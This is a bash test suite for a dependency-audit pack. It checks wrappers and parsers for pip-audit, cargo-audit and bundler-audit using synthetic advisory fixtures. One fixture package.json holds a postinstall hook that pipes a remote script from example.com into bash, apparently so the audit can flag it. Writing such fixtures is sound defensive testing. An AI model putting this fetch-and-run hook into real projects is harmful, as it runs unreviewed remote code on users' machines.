#!/usr/bin/env bash
# test-pack-dependencies-deep.sh
# Tests for the deepened dependencies audit pack (Epic 4.1).
#
# Tests:
#   1.  pack.json validates against pack.schema.json (registry validate_pack)
#   2.  checks.md has all required template sections (lint-pack.py)
#   3.  severity-rubric.json contains all dependencies/* check-ids from pack.json
#   4.  lint-pack.py passes on the dependencies pack against the real rubric
#   5.  Graceful-skip: wrap-pip-audit.sh exits 0 + coverage_gap when pip-audit absent
#   6.  Graceful-skip: wrap-cargo-audit.sh exits 0 + coverage_gap when cargo-audit absent
#   7.  Graceful-skip: wrap-bundler-audit.sh exits 0 + coverage_gap when bundle-audit absent
#   8.  Graceful-skip: wrap-pip-audit.sh exits 0 + skip when no Python manifest present
#   9.  Graceful-skip: wrap-cargo-audit.sh exits 0 + skip when no Cargo.toml present
#  10.  Graceful-skip: wrap-bundler-audit.sh exits 0 + skip when no Gemfile.lock present
#  11.  Unit test: parse-pip-audit.py emits valid deps/* findings from synthetic JSON
#  12.  Unit test: parse-pip-audit.py sets properties.tool = "pip-audit"
#  13.  Unit test: parse-pip-audit.py sets properties.ecosystem = "python"
#  14.  Unit test: parse-cargo-audit.py emits valid deps/* findings from synthetic JSON
#  15.  Unit test: parse-cargo-audit.py sets properties.tool = "cargo-audit"
#  16.  Unit test: parse-cargo-audit.py sets properties.ecosystem = "rust"
#  17.  Unit test: parse-bundler-audit.py emits valid deps/* findings from JSON format
#  18.  Unit test: parse-bundler-audit.py emits valid deps/* findings from text format
#  19.  Unit test: parse-bundler-audit.py sets properties.tool = "bundler-audit"
#  20.  Unit test: parse-bundler-audit.py sets properties.ecosystem = "ruby"
#  21.  Fixture repo (postinstall + unpinned): spine run with tools absent -> coverage_gap notes
#  22.  shellcheck: 3 new wrapper scripts are shellcheck-clean
#
# Exit 0 = all tests passed; exit 1 = one or more failures.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AUDIT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
SPINE_DIR="${AUDIT_DIR}/scripts/spine"
PACK_DIR="${AUDIT_DIR}/packs/dependencies"
LINTER="${AUDIT_DIR}/scripts/lint-pack.py"
RUBRIC="${AUDIT_DIR}/schemas/severity-rubric.json"
PARSE_PIP="${SPINE_DIR}/parse-pip-audit.py"
PARSE_CARGO="${SPINE_DIR}/parse-cargo-audit.py"
PARSE_BUNDLER="${SPINE_DIR}/parse-bundler-audit.py"
WRAP_PIP="${SPINE_DIR}/wrap-pip-audit.sh"
WRAP_CARGO="${SPINE_DIR}/wrap-cargo-audit.sh"
WRAP_BUNDLER="${SPINE_DIR}/wrap-bundler-audit.sh"

PASS=0
FAIL=0
ERRORS=()

pass() {
  printf '  [PASS] %s\n' "$1"
  PASS=$((PASS + 1))
}

fail() {
  printf '  [FAIL] %s\n' "$1"
  ERRORS+=("$1")
  FAIL=$((FAIL + 1))
}

# ---------------------------------------------------------------------------
# Temp dir for the whole test run (trailing-XXXXXX mktemp per spec)
# ---------------------------------------------------------------------------
TESTRUN_TMPDIR="$(mktemp -d /tmp/ccgm-test-deps-deep-XXXXXX)"
trap 'rm -rf "$TESTRUN_TMPDIR"' EXIT

# Build a restricted PATH that excludes pip-audit, cargo-audit, bundle-audit
SYSTEM_BINS=""
for bin in python3 bash find mktemp rm printf head grep; do
  BINPATH="$(command -v "$bin" 2>/dev/null || true)"
  if [[ -n "$BINPATH" ]]; then
    BINDIR="$(dirname "$BINPATH")"
    case ":$SYSTEM_BINS:" in
      *":$BINDIR:"*) ;;
      *) SYSTEM_BINS="${SYSTEM_BINS:+$SYSTEM_BINS:}$BINDIR" ;;
    esac
  fi
done
RESTRICTED_PATH="$SYSTEM_BINS:/usr/bin:/bin"

# ---------------------------------------------------------------------------
# Test 1: pack.json validates via lint-pack.py (no rubric)
# ---------------------------------------------------------------------------
printf '\nTest 1: pack.json schema validation (no rubric)\n'

if [[ ! -f "$PACK_DIR/pack.json" ]]; then
  fail "pack.json does not exist at $PACK_DIR/pack.json"
else
  OUT="$(python3 "$LINTER" --packs-dir "$(dirname "$PACK_DIR")" --rubric "$TESTRUN_TMPDIR/no-rubric.json" 2>&1 || true)"
  if echo "$OUT" | grep -q "^PASS: dependencies"; then
    pass "pack.json passes schema validation (no rubric)"
  else
    fail "pack.json schema validation failed: $OUT"
  fi
fi

# ---------------------------------------------------------------------------
# Test 2: checks.md has all required template sections
# ---------------------------------------------------------------------------
printf '\nTest 2: checks.md has all required sections\n'

if [[ ! -f "$PACK_DIR/checks.md" ]]; then
  fail "checks.md does not exist at $PACK_DIR/checks.md"
else
  for section_pattern in \
    "^## Scope" \
    "^## applies_when Rationale" \
    "^## Checks" \
    "^## Quality Checklist"; do
    if grep -qiE "$section_pattern" "$PACK_DIR/checks.md"; then
      pass "checks.md contains section matching '$section_pattern'"
    else
      fail "checks.md missing section matching '$section_pattern'"
    fi
  done
fi

# ---------------------------------------------------------------------------
# Test 3: severity-rubric.json contains all dependencies/* check-ids
# ---------------------------------------------------------------------------
printf '\nTest 3: rubric contains all dependencies/* check-ids from pack.json\n'

if [[ ! -f "$RUBRIC" ]]; then
  fail "severity-rubric.json not found at $RUBRIC"
else
  PACK_CHECK_IDS="$(python3 - "$PACK_DIR/pack.json" <<'PYEOF'
import json, sys
with open(sys.argv[1]) as f:
    pack = json.load(f)
for c in pack.get("checks", []):
    print(c["id"])
PYEOF
)"
  while IFS= read -r cid; do
    [[ -z "$cid" ]] && continue
    if python3 - "$RUBRIC" "$cid" <<'PYEOF'
import json, sys
with open(sys.argv[1]) as f:
    rubric = json.load(f)
checks = rubric.get("checks", {})
cid = sys.argv[2]
sys.exit(0 if cid in checks else 1)
PYEOF
    then
      pass "rubric contains check-id '$cid'"
    else
      fail "rubric MISSING check-id '$cid'"
    fi
  done <<< "$PACK_CHECK_IDS"
fi

# ---------------------------------------------------------------------------
# Test 4: lint-pack.py PASS on dependencies pack with real rubric
# ---------------------------------------------------------------------------
printf '\nTest 4: lint-pack.py PASS on dependencies pack (real rubric)\n'

OUT="$(python3 "$LINTER" --packs-dir "$(dirname "$PACK_DIR")" --rubric "$RUBRIC" 2>&1 || true)"
if echo "$OUT" | grep -q "^PASS: dependencies"; then
  pass "lint-pack.py reports PASS for dependencies with real rubric"
else
  fail "lint-pack.py did NOT report PASS for dependencies: $OUT"
fi

# ---------------------------------------------------------------------------
# Tests 5-7: Graceful-skip when tools absent (tools not installed)
# ---------------------------------------------------------------------------
printf '\nTest 5: wrap-pip-audit.sh graceful-skip when pip-audit absent\n'

MINIMAL_PYTHON_REPO="$TESTRUN_TMPDIR/python-repo"
mkdir -p "$MINIMAL_PYTHON_REPO"
printf 'requests>=2.28.0\n' > "$MINIMAL_PYTHON_REPO/requirements.txt"

PIP_OUT="$TESTRUN_TMPDIR/pip-absent.jsonl"
set +e
PATH="$RESTRICTED_PATH" bash "$WRAP_PIP" "$MINIMAL_PYTHON_REPO" > "$PIP_OUT" 2>/dev/null
PIP_EXIT=$?
set -e

if [[ $PIP_EXIT -eq 0 ]]; then
  pass "wrap-pip-audit.sh exits 0 when pip-audit absent"
else
  fail "wrap-pip-audit.sh exits $PIP_EXIT (expected 0)"
fi

if grep -q '"type":"skipped"\|"type":"coverage_gap"' "$PIP_OUT" 2>/dev/null; then
  pass "wrap-pip-audit.sh emits skip/coverage_gap when pip-audit absent"
else
  fail "wrap-pip-audit.sh produced no skip/gap notes when pip-audit absent"
fi

# Valid JSONL check
INVALID_JSON=0
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  if ! python3 -c "import json,sys; json.loads(sys.argv[1])" "$line" 2>/dev/null; then
    INVALID_JSON=$((INVALID_JSON + 1))
  fi
done < "$PIP_OUT"
if [[ $INVALID_JSON -eq 0 ]]; then
  pass "wrap-pip-audit.sh output is valid JSONL when pip-audit absent"
else
  fail "wrap-pip-audit.sh output has $INVALID_JSON invalid JSON lines"
fi

printf '\nTest 6: wrap-cargo-audit.sh graceful-skip when cargo-audit absent\n'

MINIMAL_RUST_REPO="$TESTRUN_TMPDIR/rust-repo"
mkdir -p "$MINIMAL_RUST_REPO"
printf '[package]\nname = "myapp"\nversion = "0.1.0"\n' > "$MINIMAL_RUST_REPO/Cargo.toml"

CARGO_OUT="$TESTRUN_TMPDIR/cargo-absent.jsonl"
set +e
PATH="$RESTRICTED_PATH" bash "$WRAP_CARGO" "$MINIMAL_RUST_REPO" > "$CARGO_OUT" 2>/dev/null
CARGO_EXIT=$?
set -e

if [[ $CARGO_EXIT -eq 0 ]]; then
  pass "wrap-cargo-audit.sh exits 0 when cargo-audit absent"
else
  fail "wrap-cargo-audit.sh exits $CARGO_EXIT (expected 0)"
fi

if grep -q '"type":"skipped"\|"type":"coverage_gap"' "$CARGO_OUT" 2>/dev/null; then
  pass "wrap-cargo-audit.sh emits skip/coverage_gap when cargo-audit absent"
else
  fail "wrap-cargo-audit.sh produced no skip/gap notes when cargo-audit absent"
fi

printf '\nTest 7: wrap-bundler-audit.sh graceful-skip when bundle-audit absent\n'

MINIMAL_RUBY_REPO="$TESTRUN_TMPDIR/ruby-repo"
mkdir -p "$MINIMAL_RUBY_REPO"
printf "GEM\n  remote: https://rubygems.org/\n  specs:\n    rack (2.2.4)\n\nBUNDLED WITH\n   2.4.0\n" > "$MINIMAL_RUBY_REPO/Gemfile.lock"

BUNDLER_OUT="$TESTRUN_TMPDIR/bundler-absent.jsonl"
set +e
PATH="$RESTRICTED_PATH" bash "$WRAP_BUNDLER" "$MINIMAL_RUBY_REPO" > "$BUNDLER_OUT" 2>/dev/null
BUNDLER_EXIT=$?
set -e

if [[ $BUNDLER_EXIT -eq 0 ]]; then
  pass "wrap-bundler-audit.sh exits 0 when bundle-audit absent"
else
  fail "wrap-bundler-audit.sh exits $BUNDLER_EXIT (expected 0)"
fi

if grep -q '"type":"skipped"\|"type":"coverage_gap"' "$BUNDLER_OUT" 2>/dev/null; then
  pass "wrap-bundler-audit.sh emits skip/coverage_gap when bundle-audit absent"
else
  fail "wrap-bundler-audit.sh produced no skip/gap notes when bundle-audit absent"
fi

# ---------------------------------------------------------------------------
# Tests 8-10: Graceful-skip when no manifest present
# ---------------------------------------------------------------------------
printf '\nTest 8-10: Graceful-skip when no manifest present\n'

EMPTY_REPO="$TESTRUN_TMPDIR/empty-repo"
mkdir -p "$EMPTY_REPO"

PIP_NO_MANIFEST="$TESTRUN_TMPDIR/pip-no-manifest.jsonl"
set +e
PATH="$RESTRICTED_PATH" bash "$WRAP_PIP" "$EMPTY_REPO" > "$PIP_NO_MANIFEST" 2>/dev/null
PIP_NM_EXIT=$?
set -e

if [[ $PIP_NM_EXIT -eq 0 ]]; then
  pass "wrap-pip-audit.sh exits 0 when no Python manifest"
else
  fail "wrap-pip-audit.sh exits $PIP_NM_EXIT (expected 0, no manifest)"
fi

if grep -q '"type":"skipped"\|"type":"coverage_gap"' "$PIP_NO_MANIFEST" 2>/dev/null; then
  pass "wrap-pip-audit.sh emits skip/gap note when no Python manifest"
else
  fail "wrap-pip-audit.sh: no skip/gap note when no Python manifest"
fi

CARGO_NO_MANIFEST="$TESTRUN_TMPDIR/cargo-no-manifest.jsonl"
set +e
PATH="$RESTRICTED_PATH" bash "$WRAP_CARGO" "$EMPTY_REPO" > "$CARGO_NO_MANIFEST" 2>/dev/null
CARGO_NM_EXIT=$?
set -e

if [[ $CARGO_NM_EXIT -eq 0 ]]; then
  pass "wrap-cargo-audit.sh exits 0 when no Cargo.toml"
else
  fail "wrap-cargo-audit.sh exits $CARGO_NM_EXIT (expected 0, no manifest)"
fi

BUNDLER_NO_MANIFEST="$TESTRUN_TMPDIR/bundler-no-manifest.jsonl"
set +e
PATH="$RESTRICTED_PATH" bash "$WRAP_BUNDLER" "$EMPTY_REPO" > "$BUNDLER_NO_MANIFEST" 2>/dev/null
BUNDLER_NM_EXIT=$?
set -e

if [[ $BUNDLER_NM_EXIT -eq 0 ]]; then
  pass "wrap-bundler-audit.sh exits 0 when no Gemfile.lock"
else
  fail "wrap-bundler-audit.sh exits $BUNDLER_NM_EXIT (expected 0, no manifest)"
fi

# ---------------------------------------------------------------------------
# Synthetic JSON for parse-pip-audit.py unit tests (Tests 11-13)
# ---------------------------------------------------------------------------
printf '\nTest 11-13: parse-pip-audit.py unit tests\n'

PIP_SYNTHETIC="$TESTRUN_TMPDIR/pip-audit-synthetic.json"
cat > "$PIP_SYNTHETIC" <<'JSON'
{
  "dependencies": [
    {
      "name": "cryptography",
      "version": "38.0.0",
      "vulns": [
        {
          "id": "PYSEC-2023-112",
          "fix_versions": ["41.0.0"],
          "aliases": ["CVE-2023-23931"],
          "description": "cryptography is vulnerable to Bleichenbacher timing oracle attack"
        }
      ]
    },
    {
      "name": "requests",
      "version": "2.28.0",
      "vulns": []
    }
  ]
}
JSON

PIP_PARSE_OUT="$TESTRUN_TMPDIR/pip-parsed.jsonl"
python3 "$PARSE_PIP" "$PIP_SYNTHETIC" > "$PIP_PARSE_OUT"

# Test 11: emits >= 1 valid finding
FINDING_COUNT="$(grep -c '"check_id"' "$PIP_PARSE_OUT" 2>/dev/null || printf '0')"
if [[ "$FINDING_COUNT" -ge 1 ]]; then
  pass "parse-pip-audit.py emits $FINDING_COUNT finding(s) from synthetic JSON"
else
  fail "parse-pip-audit.py emitted $FINDING_COUNT finding(s) (expected >= 1)"
fi

INVALID=0
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  if ! python3 -c "import json,sys; json.loads(sys.argv[1])" "$line" 2>/dev/null; then
    INVALID=$((INVALID + 1))
  fi
done < "$PIP_PARSE_OUT"
if [[ $INVALID -eq 0 ]]; then
  pass "parse-pip-audit.py output is valid JSONL"
else
  fail "parse-pip-audit.py output has $INVALID invalid JSON lines"
fi

# Test 12: properties.tool = "pip-audit"
if grep -q '"tool":"pip-audit"' "$PIP_PARSE_OUT"; then
  pass "parse-pip-audit.py sets properties.tool = pip-audit"
else
  fail "parse-pip-audit.py missing properties.tool = pip-audit"
fi

# Test 13: properties.ecosystem = "python"
if grep -q '"ecosystem":"python"' "$PIP_PARSE_OUT"; then
  pass "parse-pip-audit.py sets properties.ecosystem = python"
else
  fail "parse-pip-audit.py missing properties.ecosystem = python"
fi

# ---------------------------------------------------------------------------
# Synthetic JSON for parse-cargo-audit.py unit tests (Tests 14-16)
# ---------------------------------------------------------------------------
printf '\nTest 14-16: parse-cargo-audit.py unit tests\n'

CARGO_SYNTHETIC="$TESTRUN_TMPDIR/cargo-audit-synthetic.json"
cat > "$CARGO_SYNTHETIC" <<'JSON'
{
  "database": {"advisory-count": 500},
  "lockfile": {"dependency-count": 42},
  "vulnerabilities": {
    "found": true,
    "count": 1,
    "list": [
      {
        "advisory": {
          "id": "RUSTSEC-2023-0001",
          "package": "openssl",
          "title": "Use after free in EVP_KEY_CTX",
          "description": "A use-after-free vulnerability in EVP_KEY_CTX_free",
          "date": "2023-01-01",
          "url": "https://rustsec.org/advisories/RUSTSEC-2023-0001.html",
          "aliases": ["CVE-2023-0001"],
          "severity": "high"
        },
        "versions": {
          "patched": [">=1.0.2u"],
          "unaffected": []
        },
        "affected": {
          "package": {
            "name": "openssl",
            "version": "1.0.2t",
            "source": "registry+https://github.com/rust-lang/crates.io-index"
          }
        }
      }
    ]
  },
  "warnings": {"list": []}
}
JSON

CARGO_PARSE_OUT="$TESTRUN_TMPDIR/cargo-parsed.jsonl"
python3 "$PARSE_CARGO" "$CARGO_SYNTHETIC" > "$CARGO_PARSE_OUT"

FINDING_COUNT="$(grep -c '"check_id"' "$CARGO_PARSE_OUT" 2>/dev/null || printf '0')"
if [[ "$FINDING_COUNT" -ge 1 ]]; then
  pass "parse-cargo-audit.py emits $FINDING_COUNT finding(s) from synthetic JSON"
else
  fail "parse-cargo-audit.py emitted $FINDING_COUNT finding(s) (expected >= 1)"
fi

INVALID=0
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  if ! python3 -c "import json,sys; json.loads(sys.argv[1])" "$line" 2>/dev/null; then
    INVALID=$((INVALID + 1))
  fi
done < "$CARGO_PARSE_OUT"
if [[ $INVALID -eq 0 ]]; then
  pass "parse-cargo-audit.py output is valid JSONL"
else
  fail "parse-cargo-audit.py output has $INVALID invalid JSON lines"
fi

# Test 15
if grep -q '"tool":"cargo-audit"' "$CARGO_PARSE_OUT"; then
  pass "parse-cargo-audit.py sets properties.tool = cargo-audit"
else
  fail "parse-cargo-audit.py missing properties.tool = cargo-audit"
fi

# Test 16
if grep -q '"ecosystem":"rust"' "$CARGO_PARSE_OUT"; then
  pass "parse-cargo-audit.py sets properties.ecosystem = rust"
else
  fail "parse-cargo-audit.py missing properties.ecosystem = rust"
fi

# ---------------------------------------------------------------------------
# Synthetic fixtures for parse-bundler-audit.py unit tests (Tests 17-20)
# ---------------------------------------------------------------------------
printf '\nTest 17-20: parse-bundler-audit.py unit tests\n'

# JSON format fixture
BUNDLER_JSON="$TESTRUN_TMPDIR/bundler-audit-json.json"
cat > "$BUNDLER_JSON" <<'JSON'
{
  "version": "0.9.2",
  "created_at": "2024-01-01T00:00:00Z",
  "results": [
    {
      "type": "UnpatchedGem",
      "gem": {
        "name": "activesupport",
        "version": "5.2.0"
      },
      "advisory": {
        "id": "CVE-2023-22796",
        "ghsa": "GHSA-j6gc-792m-qgm2",
        "title": "Possible ReDoS vulnerability in ActiveSupport::Duration parsing",
        "date": "2023-02-09",
        "url": "https://github.com/advisories/GHSA-j6gc-792m-qgm2",
        "description": "There is a possible ReDoS vulnerability in the Duration parsing component of ActiveSupport.",
        "cvss_v3": 7.5,
        "cve": "2023-22796",
        "criticality": "high",
        "patched_versions": [">= 6.1.7.3", ">= 7.0.4.3"],
        "unaffected_versions": []
      }
    }
  ],
  "ignored": [],
  "totals": {"unpatched": 1, "ignored": 0}
}
JSON

BUNDLER_JSON_OUT="$TESTRUN_TMPDIR/bundler-json-parsed.jsonl"
python3 "$PARSE_BUNDLER" "$BUNDLER_JSON" > "$BUNDLER_JSON_OUT"

# Test 17: JSON format
FINDING_COUNT="$(grep -c '"check_id"' "$BUNDLER_JSON_OUT" 2>/dev/null || printf '0')"
if [[ "$FINDING_COUNT" -ge 1 ]]; then
  pass "parse-bundler-audit.py emits $FINDING_COUNT finding(s) from JSON format"
else
  fail "parse-bundler-audit.py emitted $FINDING_COUNT finding(s) from JSON format (expected >= 1)"
fi

INVALID=0
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  if ! python3 -c "import json,sys; json.loads(sys.argv[1])" "$line" 2>/dev/null; then
    INVALID=$((INVALID + 1))
  fi
done < "$BUNDLER_JSON_OUT"
if [[ $INVALID -eq 0 ]]; then
  pass "parse-bundler-audit.py JSON output is valid JSONL"
else
  fail "parse-bundler-audit.py JSON output has $INVALID invalid JSON lines"
fi

# Text format fixture
BUNDLER_TEXT="$TESTRUN_TMPDIR/bundler-audit-text.txt"
cat > "$BUNDLER_TEXT" <<'TEXT'
Name: rack
Version: 2.0.8
Advisory: CVE-2022-44572
Criticality: High
URL: https://github.com/advisories/GHSA-65f5-mfpf-vfhj
Title: Denial of Service Vulnerability in multipart parsing of Rack
Solution: upgrade to >= 2.0.9.1, >= 2.1.4.1, >= 2.2.6.3, >= 3.0.4.1

Vulnerabilities found!
TEXT

BUNDLER_TEXT_OUT="$TESTRUN_TMPDIR/bundler-text-parsed.jsonl"
python3 "$PARSE_BUNDLER" "$BUNDLER_TEXT" > "$BUNDLER_TEXT_OUT"

# Test 18: text format
FINDING_COUNT="$(grep -c '"check_id"' "$BUNDLER_TEXT_OUT" 2>/dev/null || printf '0')"
if [[ "$FINDING_COUNT" -ge 1 ]]; then
  pass "parse-bundler-audit.py emits $FINDING_COUNT finding(s) from text format"
else
  fail "parse-bundler-audit.py emitted $FINDING_COUNT finding(s) from text format (expected >= 1)"
fi

# Test 19: properties.tool
if grep -q '"tool":"bundler-audit"' "$BUNDLER_JSON_OUT" || grep -q '"tool":"bundler-audit"' "$BUNDLER_TEXT_OUT"; then
  pass "parse-bundler-audit.py sets properties.tool = bundler-audit"
else
  fail "parse-bundler-audit.py missing properties.tool = bundler-audit"
fi

# Test 20: properties.ecosystem
if grep -q '"ecosystem":"ruby"' "$BUNDLER_JSON_OUT" || grep -q '"ecosystem":"ruby"' "$BUNDLER_TEXT_OUT"; then
  pass "parse-bundler-audit.py sets properties.ecosystem = ruby"
else
  fail "parse-bundler-audit.py missing properties.ecosystem = ruby"
fi

# ---------------------------------------------------------------------------
# Test 21: Fixture repo with postinstall + unpinned + multi-ecosystem manifests
#          Spine run with new tools absent -> coverage_gap notes
# ---------------------------------------------------------------------------
printf '\nTest 21: Fixture repo with postinstall+unpinned+multi-ecosystem -> coverage_gap\n'

FIXTURE_REPO="$TESTRUN_TMPDIR/multi-eco-fixture"
mkdir -p "$FIXTURE_REPO"

# npm manifest with postinstall script and unpinned security dep
cat > "$FIXTURE_REPO/package.json" <<'PKGJSON'
{
  "name": "fixture-app",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.com/setup.sh | bash",
    "build": "tsc"
  },
  "dependencies": {
    "jsonwebtoken": "^9.0.0",
    "axios": "*"
  }
}
PKGJSON

# Python manifest (requirements.txt) — broadens ecosystem coverage
cat > "$FIXTURE_REPO/requirements.txt" <<'REQS'
requests>=2.28.0
cryptography>=38.0.0
REQS

# Cargo.toml — Rust manifest
cat > "$FIXTURE_REPO/Cargo.toml" <<'CARGO'
[package]
name = "fixture"
version = "0.1.0"

[dependencies]
serde = "1.0"
CARGO

# run.sh is bash-3.2-portable; no version guard needed.
SPINE_OUT="$TESTRUN_TMPDIR/spine-multi-eco.jsonl"
set +e
PATH="$RESTRICTED_PATH" bash "${SPINE_DIR}/run.sh" \
  --repo "$FIXTURE_REPO" \
  --tools "pip-audit,cargo-audit,bundler-audit" \
  --output "$SPINE_OUT" \
  2>/dev/null
SPINE_EXIT=$?
set -e

if [[ $SPINE_EXIT -eq 0 ]]; then
  pass "spine exits 0 for pip-audit,cargo-audit,bundler-audit on fixture repo (tools absent)"
else
  fail "spine exits $SPINE_EXIT (expected 0)"
fi

# Use { grep ... || true; } so a zero-match exit-1 doesn't fire the ||, preventing
# double-output under bash 3.2 when grep exits non-zero (no matches).
SKIP_OR_GAP="$({ grep -c '"type":"skipped"\|"type":"coverage_gap"' "$SPINE_OUT" || true; } 2>/dev/null)"
if [[ ${SKIP_OR_GAP:-0} -gt 0 ]]; then
  pass "spine emits $SKIP_OR_GAP skip/gap note(s) for absent tools on multi-ecosystem fixture"
else
  fail "spine emits no skip/gap notes for absent tools on multi-ecosystem fixture"
fi

# All output should be valid JSON
INVALID_JSON=0
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  if ! python3 -c "import json,sys; json.loads(sys.argv[1])" "$line" 2>/dev/null; then
    INVALID_JSON=$((INVALID_JSON + 1))
  fi
done < "$SPINE_OUT"
if [[ $INVALID_JSON -eq 0 ]]; then
  pass "spine output for multi-ecosystem fixture is valid JSONL"
else
  fail "spine output has $INVALID_JSON invalid JSON lines"
fi

# ---------------------------------------------------------------------------
# Test 22: shellcheck on 3 new wrapper scripts
# ---------------------------------------------------------------------------
printf '\nTest 22: shellcheck on new wrapper scripts\n'

if command -v shellcheck > /dev/null 2>&1; then
  for wrapper in "$WRAP_PIP" "$WRAP_CARGO" "$WRAP_BUNDLER"; do
    if [[ ! -f "$wrapper" ]]; then
      fail "shellcheck: script not found: $wrapper"
      continue
    fi
    SC_OUTPUT="$(shellcheck -S warning "$wrapper" 2>&1 || true)"
    if [[ -z "$SC_OUTPUT" ]]; then
      pass "shellcheck clean: $(basename "$wrapper")"
    else
      fail "shellcheck issues in $(basename "$wrapper"): $SC_OUTPUT"
    fi
  done
else
  pass "shellcheck not installed -- shell safety check skipped (install shellcheck for full coverage)"
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
printf '\n-------------------------------------------------\n'
printf 'Results: %d passed, %d failed\n' "$PASS" "$FAIL"

if [[ $FAIL -gt 0 ]]; then
  printf '\nFailed tests:\n'
  for err in "${ERRORS[@]}"; do
    printf '  - %s\n' "$err"
  done
  exit 1
fi

printf 'All tests passed.\n'
exit 0
